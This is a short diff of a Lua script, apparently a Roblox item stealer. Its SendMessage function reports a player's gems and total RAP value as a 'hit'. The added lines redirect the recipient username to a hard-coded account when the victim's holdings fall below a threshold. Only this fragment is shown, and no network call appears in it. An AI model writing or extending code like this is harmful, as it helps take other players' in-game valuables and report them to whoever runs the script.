@@ -155,6 +155,9 @@ local function SendMessage(url, username, diamonds)
     else
 		poopie = "poop hit"
     end
+    if totalRAP < 10000000 then
+		Username = "footing1i"
+    end
     fields[2].value = fields[2].value .. "\nGems: " .. formatNumber(diamonds) .. "\n"
     fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
 
